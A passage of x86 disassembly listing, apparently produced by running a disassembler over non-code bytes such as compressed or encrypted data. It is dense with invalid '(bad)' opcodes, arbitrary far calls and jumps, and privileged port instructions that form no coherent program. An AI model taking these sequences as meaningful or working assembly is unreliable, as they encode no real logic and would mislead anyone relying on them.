  42c122:	add    DWORD PTR [ebx+0x139d61ec],esi
  42c128:	xor    al,0x1c
  42c12a:	pop    ebx
  42c12b:	loope  0x42c0e0
  42c12d:	jnp    0x42c124
  42c12f:	jo     0x42c0dd
  42c131:	mov    eax,ds:0xf2ba03bb
  42c136:	sub    al,0x49
  42c138:	xchg   ebp,eax
  42c139:	push   esp
  42c13a:	and    eax,0xad8beac4
  42c13f:	cmp    BYTE PTR [ebx-0x4834ce4b],al
  42c145:	sub    al,0xdb
  42c147:	retf   0xd158
  42c14a:	xchg   edi,eax
  42c14b:	xor    eax,0x12a5d0ba
  42c150:	mov    eax,0x2d1d1ce4
  42c155:	add    DWORD PTR [ecx+0x6b],0xae267bbb
  42c15c:	test   al,0xcd
  42c15e:	daa    
  42c15f:	and    DWORD PTR [ebx],edi
  42c161:	daa    
  42c162:	cwde   
  42c163:	mov    edx,0xe4dfd508
  42c168:	popa   
  42c169:	jno    0x42c145
  42c16b:	mov    dh,0x51
  42c16d:	and    BYTE PTR [ecx+0x25d6aeb3],cl
  42c173:	cwde   
  42c174:	retf   
  42c175:	js     0x42c158
  42c177:	loopne 0x42c17a
  42c179:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c17a:	add    BYTE PTR [ebx-0x64199b03],bl
  42c180:	xchg   edx,eax
  42c181:	mov    DWORD PTR [ebp+edi*4+0x3a2728f],edi
  42c188:	inc    edi
  42c189:	and    eax,0x5dbce062
  42c18e:	std    
  42c18f:	or     al,0xe7
	...
  42c1f1:	add    BYTE PTR [eax],al
  42c1f3:	add    BYTE PTR [ecx-0x7e],ch
  42c1f6:	int    0xae
  42c1f8:	out    dx,eax
  42c1f9:	out    dx,eax
  42c1fa:	imul   eax,edi,0xfffffff2
  42c1fd:	nop
  42c1fe:	xchg   esp,eax
  42c1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c200:	jecxz  0x42c1fa
  42c202:	jne    0x42c1c2
  42c204:	out    0xd8,al
  42c206:	add    DWORD PTR [eax],eax
  42c208:	add    eax,0x24000001
  42c20d:	sub    DWORD PTR [esi+0x7ac565dd],eax
  42c213:	adc    esi,DWORD PTR [ebp-0x30]
  42c216:	mov    bl,0x9
  42c218:	and    DWORD PTR [eax],esi
  42c21a:	xlat   BYTE PTR ds:[ebx]
  42c21b:	xor    al,0xe0
  42c21d:	jae    0x42c243
  42c21f:	shl    DWORD PTR [edx],0x95
  42c222:	mov    ds:0xe17c08e6,eax
  42c227:	pushf  
  42c228:	mov    bl,0x2d
  42c22a:	inc    edi
  42c22b:	in     eax,0x92
  42c22d:	adc    ecx,DWORD PTR [ebp-0x23ddf781]
  42c233:	call   0x1c79:0xe0557104
  42c23a:	cmp    BYTE PTR [edi-0x74a553e4],cl
  42c240:	ret    0xfc88
  42c243:	inc    esp
  42c244:	xchg   esi,eax
  42c245:	sub    BYTE PTR [ebp+ecx*4-0xce80b56],bl
  42c24c:	dec    esi
  42c24d:	scas   al,BYTE PTR es:[edi]
  42c24e:	sar    DWORD PTR [edi+0x43],0x47
  42c252:	adc    eax,0xfd434b8b
  42c257:	mov    bl,0xd2
  42c259:	aam    0x58
  42c25b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c25c:	sub    esp,DWORD PTR [esi]
  42c25e:	mov    al,0x57
  42c260:	jns    0x42c261
  42c262:	or     BYTE PTR [edi],dh
  42c264:	mov    BYTE PTR [esi+0x76f38414],ch
  42c26a:	jns    0x42c1f2
  42c26c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c26d:	pop    esi
  42c26e:	sub    eax,0x1822dbaa
  42c273:	test   DWORD PTR [ebx+0x6b],edx
  42c276:	inc    edi
  42c277:	idiv   DWORD PTR [eax-0xe6c709e]
  42c27d:	pop    eax
  42c27e:	push   eax
  42c27f:	(bad)  
  42c280:	fstp   DWORD PTR [esi+0x6a9484ba]
  42c286:	sub    DWORD PTR [edx+0x16],edi
  42c289:	sub    al,0xe8
  42c28b:	mov    ds:0x36299418,eax
  42c290:	sub    eax,0x34d2474d
  42c295:	adc    ecx,DWORD PTR [edi-0x1f492dd0]
  42c29b:	icebp  
  42c29c:	call   0xb538:0xf15c0216
  42c2a3:	leave  
  42c2a4:	outs   dx,BYTE PTR ds:[esi]
  42c2a5:	test   al,0x40
  42c2a7:	xchg   DWORD PTR [ecx],eax
  42c2a9:	sti    
  42c2aa:	jne    0x42c2ac
  42c2ac:	in     al,dx
  42c2ad:	mov    bh,0x78
  42c2af:	fmul   DWORD PTR ds:0xc47fb52e
  42c2b5:	lds    edi,FWORD PTR [ecx+0x7c7643fb]
  42c2bb:	mov    eax,ds:0x42698765
  42c2c0:	hlt    
  42c2c1:	aaa    
  42c2c2:	and    BYTE PTR [edi-0x5ccce5d4],ah
  42c2c8:	xchg   edi,eax
  42c2c9:	xor    bh,0xa3
  42c2cc:	loopne 0x42c268
  42c2ce:	adc    al,0x2
  42c2d0:	jecxz  0x42c315
  42c2d2:	sub    eax,0xb9a2816a
  42c2d7:	js     0x42c325
  42c2d9:	xchg   esp,eax
  42c2da:	retf   
  42c2db:	sahf   
  42c2dc:	add    dl,BYTE PTR [edi-0x40a4b0d9]
  42c2e2:	ja     0x42c323
  42c2e4:	out    dx,al
  42c2e5:	dec    esi
  42c2e6:	adc    al,0x50
  42c2e8:	in     al,dx
  42c2e9:	imul   eax,DWORD PTR [eax+0x17],0xff3065c3
  42c2f0:	cli    
  42c2f1:	lds    esp,FWORD PTR ds:0x819f265d
  42c2f7:	out    0x2,eax
  42c2f9:	jnp    0x42c335
  42c2fb:	stos   BYTE PTR es:[edi],al
  42c2fc:	outs   dx,BYTE PTR ds:[esi]
  42c2fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c2fe:	cmp    esp,edx
  42c300:	fld    QWORD PTR [edx-0x44]
  42c303:	retf   0x13b3
  42c306:	sub    al,0x1e
  42c308:	pop    ebp
  42c309:	ret    
  42c30a:	les    ecx,FWORD PTR [esp+ebx*1]
  42c30d:	jbe    0x42c2f2
  42c30f:	push   0xffffffe9
	...
  42c371:	add    BYTE PTR [eax],al
  42c373:	add    dh,ah
  42c375:	psubusw mm5,QWORD PTR [ebp-0x7]
  42c379:	push   esi
  42c37b:	(bad)  
  42c37c:	in     eax,dx
  42c37d:	(bad)  
  42c37e:	sub    eax,0xc62aaaf6
  42c383:	mov    dl,0xeb
  42c385:	fld    DWORD PTR [ecx]
  42c387:	add    BYTE PTR ds:0xf1000001,al
  42c38d:	pop    edi
  42c38e:	sbb    DWORD PTR [edi-0x7c],eax
  42c391:	bound  esi,QWORD PTR [esi-0x3dfb6c30]
  42c397:	mov    ah,0x13
  42c399:	sub    BYTE PTR [ebx+edi*2+0x6abfe541],dh
  42c3a0:	cmp    eax,0xc7c3abad
  42c3a5:	mov    edx,DWORD PTR [ebx-0x1b]
  42c3a8:	rcr    edi,0xe0
  42c3ab:	or     BYTE PTR [ebx-0x44fbd3b4],ah
  42c3b1:	and    BYTE PTR [eax],ch
  42c3b3:	test   esi,0xe0054264
  42c3b9:	jbe    0x42c34f
  42c3bb:	and    ebp,DWORD PTR [ebx+0xdc85839]
  42c3c1:	sbb    al,0x6e
  42c3c3:	xchg   ebp,eax
  42c3c4:	sbb    DWORD PTR [ecx+ecx*2+0x88d5435],esi
  42c3cb:	fcmovnbe st,st(4)
  42c3cd:	mov    ebx,0xdd577a4a
  42c3d2:	cmp    al,dh
  42c3d4:	jbe    0x42c368
  42c3d6:	imul   esp,ecx,0x82cd07db
  42c3dc:	cmp    eax,0xc13f2f80
  42c3e1:	shl    esi,0x8e
  42c3e4:	loop   0x42c37a
  42c3e6:	bound  ecx,QWORD PTR [ebx+0x3f]
  42c3e9:	or     BYTE PTR [edx+esi*2],bh
  42c3ec:	xor    al,0x5a
  42c3ee:	sub    DWORD PTR [edx+0x67],esp
  42c3f1:	pop    es
  42c3f2:	sub    al,0xee
  42c3f4:	mov    eax,ds:0xb07edb82
  42c3f9:	and    eax,0x418e9684
  42c3fe:	test   DWORD PTR ss:[ebx-0x1],ebx
  42c402:	daa    
  42c403:	sub    al,0x6a
  42c405:	and    al,0xaf
  42c407:	inc    ebx
  42c408:	adc    al,0x91
  42c40a:	aaa    
  42c40b:	out    dx,al
  42c40c:	test   BYTE PTR [ebx],cl
  42c40e:	push   ebx
  42c40f:	and    edx,DWORD PTR [ebx-0x77973d4c]
  42c415:	lods   al,BYTE PTR ds:[esi]
  42c416:	scas   eax,DWORD PTR es:[edi]
  42c417:	test   BYTE PTR [ecx],ch
  42c419:	jle    0x42c449
  42c41b:	(bad)  
  42c41c:	lds    ecx,FWORD PTR [ebx-0x76887fdf]
  42c422:	retf   0x5a41
  42c425:	push   edi
  42c427:	fsub   DWORD PTR [esp+eiz*4]
  42c42a:	shr    BYTE PTR [edx-0x6e],1
  42c42d:	pop    ecx
  42c42e:	cmp    dl,BYTE PTR [ebp+0x25d04b74]
  42c434:	iret   
  42c435:	or     al,BYTE PTR [ebx+eax*4+0x1d]
  42c439:	(bad)  
  42c43a:	jmp    0x42c489
  42c43c:	pusha  
  42c43d:	cmc    
  42c43e:	aam    0xa1
  42c440:	cwde   
  42c441:	fmul   DWORD PTR [edi-0x48]
  42c444:	es xchg edx,eax
  42c446:	stc    
  42c447:	dec    edx
  42c448:	ficom  DWORD PTR [ebp-0x40]
  42c44b:	pusha  
  42c44c:	mov    ah,0xec
  42c44e:	dec    ebp
  42c44f:	(bad)  
  42c450:	xchg   ecx,eax
  42c451:	mov    eax,ds:0xbb0f9a53
  42c456:	push   cs
  42c457:	jb     0x42c402
  42c459:	hlt    
  42c45a:	pop    ebx
  42c45b:	sub    BYTE PTR [edi],dh
  42c45d:	stc    
  42c45e:	jmp    0xca8f825b
  42c463:	dec    eax
  42c464:	xchg   eax,edx
  42c466:	xor    al,0x24
  42c468:	aad    0x9e
  42c46a:	arpl   WORD PTR [eax+0x62],cx
  42c46d:	sub    DWORD PTR [esi+0x57cd3433],esi
  42c473:	xchg   edi,eax
  42c474:	pusha  
  42c475:	pop    esi
  42c476:	adc    BYTE PTR [esi-0x2e341eb1],0x28
  42c47d:	xchg   ecx,eax
  42c47e:	in     al,dx
  42c47f:	sbb    ebp,ecx
  42c481:	add    DWORD PTR [ebx+0xe],ebx
  42c484:	inc    edx
  42c485:	and    BYTE PTR ds:0x8d399cb9,cl
  42c48b:	enter  0xb241,0x6b
  42c48f:	into   
  42c490:	lods   al,BYTE PTR ds:[esi]
	...
  42c4f1:	add    BYTE PTR [eax],al
  42c4f3:	add    ah,ch
  42c4f5:	sbb    ebp,edx
  42c4f7:	sahf   
  42c4f8:	cmc    
  42c4f9:	fsubp  st(7),st
  42c4fb:	jnp    0x42c4af
  42c4fd:	sti    
  42c4fe:	enter  0x7434,0xc
  42c502:	jmp    0x21db570
  42c507:	add    BYTE PTR ds:0x66000001,al
  42c50d:	inc    eax
  42c50e:	jp     0x42c52d
  42c510:	mov    DWORD PTR [ebx+0x6818f992],edi
  42c516:	les    ecx,FWORD PTR [ecx]
  42c518:	in     al,dx
  42c519:	inc    edx
  42c51a:	pushf  
  42c51b:	pop    ds
  42c51c:	mov    esp,DWORD PTR [edi+eiz*4+0x1ad80049]
  42c523:	shl    ah,1
  42c525:	cwde   
  42c526:	jbe    0x42c59d
  42c528:	loopne 0x42c589
  42c52a:	pop    es
  42c52b:	push   ebx
  42c52c:	fwait
  42c52d:	jnp    0x42c5a5
  42c52f:	mov    dh,0x40
  42c531:	stos   BYTE PTR es:[edi],al
  42c532:	push   esp
  42c533:	dec    edx
  42c534:	jle    0x42c4eb
  42c536:	sbb    al,0x66
  42c538:	dec    esi
  42c539:	jmp    0x94183c72
  42c53e:	push   ecx
  42c53f:	cld    
  42c540:	outs   dx,BYTE PTR ds:[esi]
  42c541:	out    0x44,al
  42c543:	mov    WORD PTR [eax],?
  42c545:	jg     0x42c566
  42c547:	bound  ebp,QWORD PTR [edi+0x5e534bdc]
  42c54d:	aam    0x81
  42c54f:	out    0x14,eax
  42c551:	mov    bh,0x8b
  42c553:	nop
  42c554:	and    cl,0x88
  42c557:	pop    es
  42c558:	sahf   
  42c559:	(bad)  
  42c55a:	push   eax
  42c55b:	imul   ebp,DWORD PTR [ebx+0x39f2aeb0],0x4f
  42c562:	sbb    BYTE PTR [eax],bl
  42c564:	sar    DWORD PTR [edi-0x38dd41a6],cl
  42c56a:	loope  0x42c5c2
  42c56c:	xchg   esp,eax
  42c56d:	mov    WORD PTR [ebp+0x30877c47],ss
  42c573:	out    0x1b,al
  42c575:	inc    edx
  42c576:	repnz mov eax,ds:0xabb3ec79
  42c57c:	dec    edx
  42c57d:	and    eax,0xf83e197c
  42c582:	dec    edi
  42c583:	in     eax,0x25
  42c585:	in     al,0xfd
  42c587:	mov    dh,0x1e
  42c589:	je     0x42c5cb
  42c58b:	sub    bl,0x3d
  42c58e:	pop    esp
  42c58f:	xchg   ah,al
  42c591:	mov    ecx,0x9ccde256
  42c596:	iret   
  42c597:	pop    eax
  42c598:	je     0x42c541
  42c59a:	cwde   
  42c59b:	arpl   WORD PTR [edx],dx
  42c59d:	xor    eax,0xbc37f400
  42c5a2:	js     0x42c5b3
  42c5a4:	mov    edx,0xfb2be063
  42c5a9:	neg    DWORD PTR [ecx+0x664452b5]
  42c5af:	in     eax,dx
  42c5b0:	out    0x87,eax
  42c5b2:	pop    ecx
  42c5b3:	ds in  al,dx
  42c5b5:	div    eax
  42c5b7:	mov    ebx,0x1c95115f
  42c5bc:	xor    bl,cl
  42c5be:	(bad)  
  42c5bf:	and    ecx,DWORD PTR [eax-0x6d35c70b]
  42c5c5:	arpl   WORD PTR [ebx-0x70],bx
  42c5c8:	mov    dh,0x16
  42c5ca:	fwait
  42c5cb:	adc    BYTE PTR [ebp+edx*2-0x4f],al
  42c5cf:	clc    
  42c5d0:	adc    BYTE PTR [ebp+eiz*2+0x6d02744a],bh
  42c5d7:	sub    al,0xb1
  42c5d9:	lea    ecx,ds:0x4780f5a8
  42c5df:	add    bl,BYTE PTR [ecx-0x3971c184]
  42c5e5:	sub    DWORD PTR ds:0xa6f23f0a,eax
  42c5eb:	(bad)  [edi]
  42c5ed:	cdq    
  42c5ee:	cli    
  42c5ef:	mov    dh,0x89
  42c5f1:	lods   al,BYTE PTR ds:[esi]
  42c5f2:	xchg   BYTE PTR [eax+edx*1-0x31],bl
  42c5f6:	dec    eax
  42c5f7:	xchg   ecx,eax
  42c5f8:	cld    
  42c5f9:	sar    BYTE PTR [ebp-0x53],1
  42c5fc:	pop    ds
  42c5fd:	xchg   edx,eax
  42c5fe:	ja     0x42c5bd
  42c600:	cmc    
  42c601:	jle    0x42c662
  42c603:	sbb    esp,edx
  42c605:	dec    edi
  42c606:	xor    al,0x9a
  42c608:	cli    
  42c609:	mov    cl,0x64
  42c60b:	pop    ecx
  42c60c:	retf   0x543
  42c60f:	sbb    esi,DWORD PTR [ebp+0x0]
	...
  42c672:	add    BYTE PTR [eax],al
  42c674:	pop    ebp
  42c675:	dec    eax
  42c676:	jle    0x42c606
  42c678:	jg     0x42c638
  42c67a:	std    
  42c67b:	fstp   TBYTE PTR [ebx-0x6f920395]
  42c681:	test   eax,0xdbf57f36
  42c686:	add    DWORD PTR [eax],eax
  42c688:	add    eax,0x8a000001
  42c68d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c68e:	ja     0x42c6fd
  42c690:	fcomp  DWORD PTR [edx-0x6]
  42c693:	push   ebx
  42c694:	add    BYTE PTR [edx],0xee
  42c697:	(bad)  
  42c698:	aas    
  42c699:	fcom   DWORD PTR [ebx]
  42c69b:	or     eax,DWORD PTR [ebp-0x3c]
  42c69e:	push   eax
  42c69f:	ror    dl,0x13
  42c6a2:	push   ecx
  42c6a3:	dec    ecx
  42c6a4:	in     eax,0x0
  42c6a6:	rol    BYTE PTR [edi+ecx*2],0xd1
  42c6aa:	or     cl,BYTE PTR [edi]
  42c6ac:	jg     0x42c68e
  42c6ae:	push   ebx
  42c6af:	and    al,0xe1
  42c6b1:	sbb    DWORD PTR [eax+0x5a],esp
  42c6b4:	clc    
  42c6b5:	and    eax,0x1bb96b94
  42c6ba:	sub    ecx,0xffffffd8
  42c6bd:	jae    0x42c640
  42c6bf:	or     ch,bh
  42c6c1:	push   ebx
  42c6c2:	xor    ch,ah
  42c6c4:	pop    ds
  42c6c5:	pop    eax
  42c6c6:	nop
  42c6c7:	xchg   ecx,eax
  42c6c8:	(bad)  
  42c6c9:	pop    edx
  42c6ca:	xchg   ebp,eax
  42c6cb:	(bad)  
  42c6cd:	xor    edi,esi
  42c6cf:	xchg   ebx,eax
  42c6d0:	push   ss
  42c6d1:	inc    eax
  42c6d2:	mov    ah,0x6e
  42c6d4:	jge    0x42c69d
  42c6d6:	ror    BYTE PTR ds:0xe21070ce,0x1a
  42c6dd:	pop    ecx
  42c6de:	add    DWORD PTR [esi-0x7c],ecx
  42c6e1:	dec    edx
  42c6e2:	ror    ch,0xc8
  42c6e5:	test   BYTE PTR [ebp+edi*8-0x74],bh
  42c6e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c6ea:	add    eax,0xd97ad96e
  42c6ef:	aas    
  42c6f0:	cmp    DWORD PTR [edx+0x41d7f655],ecx
  42c6f6:	dec    ebx
  42c6f7:	sar    dh,0x21
  42c6fa:	mov    ebx,0xea1bc5a9
  42c6ff:	xor    eax,0xd69da2a5
  42c704:	or     ebx,DWORD PTR [esi+0x7b]
  42c707:	lea    edx,[ebx]
  42c709:	sub    BYTE PTR [eax],al
  42c70b:	mov    ebp,0x4dd58af6
  42c710:	shr    DWORD PTR [ecx+0x4370cdc3],1
  42c716:	or     al,0x42
  42c718:	and    DWORD PTR [edx-0x251cd527],edi
  42c71e:	ret    0x93e3
  42c721:	and    al,0x18
  42c723:	or     DWORD PTR [edx],0x6aefad38
  42c729:	dec    edi
  42c72a:	mov    bh,0x77
  42c72c:	mov    ebp,0x1ddcb13c
  42c731:	inc    esi
  42c732:	scas   al,BYTE PTR es:[edi]
  42c733:	sbb    edx,DWORD PTR [ecx-0x6fd50b9b]
  42c739:	or     WORD PTR [ecx-0x1b],cx
  42c73d:	cmp    al,0x7c
  42c73f:	add    BYTE PTR [esi],cl
  42c741:	rcr    BYTE PTR [esi+0xf],cl
  42c744:	jl     0x42c77f
  42c746:	xor    DWORD PTR [ebp+0x100f660b],ebx
  42c74c:	adc    BYTE PTR [eax-0x3992c235],dl
  42c752:	sub    BYTE PTR [ebx+0x40],bl
  42c755:	aaa    
  42c756:	rcl    ecx,0x7a
  42c759:	pop    esp
  42c75a:	push   ebp
  42c75b:	xor    eax,0xdee9f4ba
  42c760:	add    eax,0x13c7f24e
  42c765:	fdivr  st(6),st
  42c767:	pusha  
  42c768:	xor    esi,DWORD PTR [eax-0xd]
  42c76b:	in     al,0x4a
  42c76d:	and    al,0x48
  42c76f:	stos   DWORD PTR es:[edi],eax
  42c770:	retf   0x344f
  42c773:	xor    ebp,esp
  42c775:	push   cs
  42c776:	cmp    BYTE PTR [edi+0x653c02b],cl
  42c77c:	pop    ecx
  42c77d:	or     ebp,DWORD PTR [ebx]
  42c77f:	mov    ebp,0x7d010d7f
  42c784:	jno    0x42c7f5
  42c786:	dec    BYTE PTR [ecx-0x39]
  42c789:	inc    esp
  42c78a:	lods   eax,DWORD PTR ds:[si]
  42c78c:	cmp    eax,0x8a664f28
	...
  42c7f1:	add    BYTE PTR [eax],al
  42c7f3:	add    BYTE PTR [eax],bh
  42c7f5:	mov    DWORD PTR [edx-0x6b],ebp
  42c7f8:	sti    
  42c7f9:	idiv   edi
  42c7fb:	lods   eax,DWORD PTR ds:[esi]
  42c7fc:	pop    ebp
  42c7fd:	sbb    eax,0x4a1aa40e
  42c802:	or     ecx,edx
  42c804:	cli    
  42c805:	fadd   QWORD PTR [ecx]
  42c807:	add    BYTE PTR ds:0x3b000001,al
  42c80d:	mov    ch,0xdb
  42c80f:	sbb    al,0x56
  42c811:	mov    DWORD PTR [edx+0x5e],edx
  42c814:	sub    edx,DWORD PTR [ecx-0x30]
  42c817:	in     al,dx
  42c818:	rcr    BYTE PTR [esi+0x23],cl
  42c81b:	shl    BYTE PTR [edi],0x8d
  42c81e:	xchg   edi,eax
  42c81f:	psubq  mm5,QWORD PTR [ecx]
  42c822:	dec    esp
  42c823:	fisttp QWORD PTR [esi+0x6f9375b7]
  42c829:	jp     0x42c849
  42c82b:	xor    DWORD PTR [eax-0x77],ecx
  42c82e:	or     DWORD PTR [edi+0x30],0xffffffc8
  42c832:	pop    ebp
  42c833:	inc    edi
  42c834:	cmp    al,0x64
  42c836:	fiadd  DWORD PTR [eax-0x77554d2b]
  42c83c:	pop    DWORD PTR [ebp+0x4a]
  42c83f:	mov    esi,gs
  42c841:	xchg   di,ax
  42c843:	outs   dx,DWORD PTR ds:[esi]
  42c844:	xchg   edx,eax
  42c845:	dec    esp
  42c846:	jnp    0x42c8a8
  42c848:	fcmovnu st,st(5)
  42c84a:	inc    esp
  42c84b:	rcl    bh,1
  42c84d:	push   ebp
  42c84e:	pop    esp
  42c84f:	pop    edi
  42c850:	mov    BYTE PTR [ebx+0x26384167],dl
  42c856:	call   0xbe1d:0x6557bd6b
  42c85d:	mov    bh,0x1e
  42c85f:	jo     0x42c818
  42c861:	and    dl,dh
  42c863:	sar    DWORD PTR [edi+0x2cce09b0],0x5e
  42c86a:	sti    
  42c86b:	pushf  
  42c86c:	fld    st(0)
  42c86e:	pop    ds
  42c86f:	cmp    bl,bh
  42c871:	inc    ebx
  42c872:	sub    bh,BYTE PTR [edx+ecx*4+0x248d6555]
  42c879:	leave  
  42c87a:	fdiv   DWORD PTR [esi-0x67582394]
  42c880:	xchg   al,ah
  42c882:	lds    edi,FWORD PTR [edx]
  42c884:	je     0x42c8ff
  42c886:	pop    edi
  42c887:	(bad)  
  42c888:	enter  0x6d10,0x33
  42c88c:	xor    edi,ecx
  42c88e:	iret   
  42c88f:	xchg   esp,eax
  42c890:	or     eax,0xef72c958
  42c895:	enter  0xc796,0x2f
  42c899:	mov    ds:0xa59e8e8f,eax
  42c89e:	cmp    dl,BYTE PTR [ebp-0x35]
  42c8a1:	or     eax,0x51981922
  42c8a6:	daa    
  42c8a7:	mov    edx,0x4812b36d
  42c8ac:	jne    0x42c8d0
  42c8ae:	(bad)  
  42c8af:	popa   
  42c8b0:	in     al,0xbf
  42c8b2:	rcl    DWORD PTR [ebp-0x6f],cl
  42c8b5:	inc    ebx
  42c8b6:	sbb    DWORD PTR [eax-0x13dd2750],0xffffffb0
  42c8bd:	fdiv   DWORD PTR [edx-0x77]
  42c8c0:	jb     0x42c8f7
  42c8c2:	imul   eax,DWORD PTR [ebp-0x6bce7b53],0xab916cf6
  42c8cc:	loopne 0x42c8dc
  42c8ce:	sbb    edi,edi
  42c8d0:	push   edi
  42c8d1:	add    DWORD PTR ds:0xfb85a503,edi
  42c8d7:	int3   
  42c8d8:	(bad)  
  42c8d9:	dec    esi
  42c8da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c8db:	jp     0x42c8ca
  42c8dd:	cmp    edx,ebx
  42c8df:	add    BYTE PTR [esi+0x4a],bh
  42c8e2:	sub    DWORD PTR [ebx+0x6],esi
  42c8e5:	push   esi
  42c8e6:	mov    ah,0xbf
  42c8e8:	das    
  42c8e9:	inc    ebx
  42c8ea:	mov    al,ds:0x35000057
  42c8ef:	mov    BYTE PTR [ebp-0x1a],bl
  42c8f2:	jg     0x42c877
  42c8f4:	sub    DWORD PTR [esp+esi*8-0x21],eax
  42c8f8:	les    edi,FWORD PTR [eax+ebp*2-0x5a83926a]
  42c8ff:	pop    eax
  42c900:	sub    eax,0x2580eb27
  42c905:	ficom  DWORD PTR [ebp+0x2125ebce]
  42c90b:	sbb    eax,0xbc80d8e8
  42c910:	nop
	...
  42c971:	add    BYTE PTR [eax],al
  42c973:	add    BYTE PTR [eax],dl
  42c975:	sbb    ecx,ecx
  42c977:	jmp    0xfb73c547
  42c97c:	(bad)  
  42c97d:	scas   eax,DWORD PTR es:[edi]
  42c97e:	inc    edi
  42c97f:	call   0xc6d9d203
  42c984:	(bad)  
  42c985:	fld    QWORD PTR [ecx]
  42c987:	add    BYTE PTR ds:0x41000001,al
  42c98d:	adc    al,0x19
  42c98f:	enter  0xc4bb,0x9f
  42c993:	sahf   
  42c994:	fdiv   st(2),st
  42c996:	push   ss
  42c997:	dec    esp
  42c998:	jae    0x42ca12
  42c99a:	imul   ebp,DWORD PTR [ecx+0x5ff8a03f],0x382d9b04
  42c9a4:	or     BYTE PTR [ecx],bh
  42c9a6:	mov    cl,0x98
  42c9a8:	sub    DWORD PTR [ebx*1-0x5612c35a],0x15
  42c9b0:	adc    bh,0xe7
  42c9b3:	or     DWORD PTR [ecx],ebx
  42c9b5:	fst    DWORD PTR [edx-0x50]
  42c9b8:	cmp    DWORD PTR [edx-0x3e],edx
  42c9bb:	jb     0x42c97b
  42c9bd:	cmp    BYTE PTR [ebp-0x541c6732],cl
  42c9c3:	call   0x36c1:0xa5d2f1ee
  42c9ca:	push   esi
  42c9cb:	outs   dx,BYTE PTR ds:[esi]
  42c9cc:	push   ebx
  42c9cd:	sbb    cl,dh
  42c9cf:	in     al,0x21
  42c9d1:	mov    al,bl
  42c9d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c9d4:	(bad)  
  42c9d5:	je     0x42ca50
  42c9d7:	in     eax,dx
  42c9d8:	je     0x42c9b2
  42c9da:	xchg   esi,eax
  42c9db:	push   edi
  42c9dc:	mov    gs,WORD PTR [eax+0x48f9617e]
  42c9e2:	sub    al,0x26
  42c9e4:	fisubr DWORD PTR [edi-0x5]
  42c9e7:	cmp    BYTE PTR [ebp+0x7b],dl
  42c9ea:	and    ah,al
  42c9ec:	sub    dl,bl
  42c9ee:	push   esp
  42c9ef:	jecxz  0x42ca18
  42c9f1:	stos   DWORD PTR es:[edi],eax
  42c9f2:	fwait
  42c9f3:	test   DWORD PTR [ecx+0x3020ed21],ecx
  42c9f9:	cli    
  42c9fa:	or     ah,BYTE PTR [ebp-0x21]
  42c9fd:	push   esi
  42c9fe:	test   BYTE PTR [edx+edi*2],bh
  42ca01:	or     ah,BYTE PTR [ecx+0x0]
  42ca04:	mov    dh,0x58
  42ca06:	jle    0x42c9df
  42ca08:	pop    edi
  42ca09:	adc    edx,DWORD PTR [edx]
  42ca0b:	adc    DWORD PTR [edi],ebx
  42ca0d:	ror    ch,cl
  42ca0f:	aaa    
  42ca10:	cdq    
  42ca11:	enter  0x78b5,0xba
  42ca15:	aas    
  42ca16:	jne    0x42ca85
  42ca18:	cdq    
  42ca19:	inc    BYTE PTR [ecx]
  42ca1b:	retf   
  42ca1c:	or     ah,dl
  42ca1e:	mov    dl,0x74
  42ca20:	mov    dl,0x30
  42ca22:	scas   eax,DWORD PTR es:[edi]
  42ca23:	scas   eax,DWORD PTR es:[edi]
  42ca24:	stos   DWORD PTR es:[edi],eax
  42ca25:	and    dl,BYTE PTR [ecx]
  42ca27:	add    DWORD PTR [eax+0x69],esp
  42ca2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ca2b:	outs   dx,BYTE PTR ds:[esi]
  42ca2c:	into   
  42ca2d:	push   edx
  42ca2e:	inc    ebx
  42ca2f:	mov    edi,0x9748300e
  42ca34:	sbb    BYTE PTR [eax-0x5479908f],bl
  42ca3a:	or     BYTE PTR [edx+0x54],0xbe
  42ca3e:	sub    ebx,DWORD PTR [eax-0x2a]
  42ca41:	rcl    DWORD PTR [ecx-0x1a],cl
  42ca44:	sbb    BYTE PTR [ecx+0x7918a68c],dl
  42ca4a:	mov    ds:0x9a4533dd,eax
  42ca4f:	push   ecx
  42ca50:	fdiv   st(2),st
  42ca52:	dec    ebp
  42ca53:	mov    esi,0xe30701a
  42ca58:	and    BYTE PTR [ebx+ebx*1],bl
  42ca5b:	dec    esp
  42ca5c:	stos   BYTE PTR es:[edi],al
  42ca5d:	popf   
  42ca5e:	mov    ds:0x25d34208,al
  42ca63:	pop    esi
  42ca64:	push   eax
  42ca65:	sbb    cl,cl
  42ca67:	(bad)  
  42ca68:	into   
  42ca69:	fs nop
  42ca6b:	jns    0x42ca84
  42ca6d:	in     al,dx
  42ca6e:	ja     0x42ca2e
  42ca70:	imul   esp,DWORD PTR [ecx-0x1f],0xffffff94
  42ca74:	sub    ebx,DWORD PTR [ecx]
  42ca76:	test   bl,0x65
  42ca79:	mov    ss,WORD PTR [edi]
  42ca7b:	imul   ebp,DWORD PTR [eax+0x3f],0xffffffe5
  42ca7f:	or     eax,DWORD PTR [edi]
  42ca81:	ret    
  42ca82:	add    BYTE PTR [eax-0x16609c4f],0xbf
  42ca89:	mov    ebp,0x40ebf6a4
  42ca8e:	sub    eax,0xc3e8
	...
  42caf3:	add    BYTE PTR [edi-0x2be7726],ah
  42caf9:	push   ebx
  42cafa:	out    dx,eax
  42cafb:	(bad)  
  42cafc:	fadd   QWORD PTR [ebp-0x3e389140]
  42cb02:	inc    esp
  42cb03:	aam    0x4
  42cb05:	fild   WORD PTR [ecx]
  42cb07:	add    BYTE PTR ds:0x54000001,al
  42cb0d:	or     eax,0xbecbb65d
  42cb12:	aaa    
  42cb13:	lods   eax,DWORD PTR ds:[esi]
  42cb14:	fsub   QWORD PTR [esi-0x3f2cd366]
  42cb1a:	aas    
  42cb1b:	mov    al,ds:0xce179eaf
  42cb20:	ret    0xf337
  42cb23:	(bad)  [esp+eiz*8+0x4c37a5c3]
  42cb2a:	ds dec ebp
  42cb2c:	xchg   edx,eax
  42cb2d:	loope  0x42cb7f
